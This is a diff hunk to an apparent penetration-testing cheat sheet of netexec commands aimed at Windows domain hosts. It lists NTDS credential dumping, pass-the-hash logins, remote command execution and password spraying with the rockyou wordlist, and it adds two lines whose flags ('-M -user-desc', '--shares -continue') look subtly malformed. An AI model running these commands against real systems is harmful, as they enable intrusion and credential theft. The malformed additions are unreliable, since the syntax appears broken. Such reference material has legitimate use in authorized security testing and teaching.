@@ -660,6 +660,7 @@ $ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
 $ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
 $ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
 $ netexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
+$ netexec ldap <RHOST> -u '' -p '' -M -user-desc
 $ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
 $ netexec ldap <RHOST> -u "" -p "" -M get-desc-users
 $ netexec ldap <RHOST> -u "" -p "" --use-kcache -M whoami
@@ -673,6 +674,7 @@ $ netexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
 $ netexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
 $ netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 $ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares -continue
 $ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
 $ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
 $ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
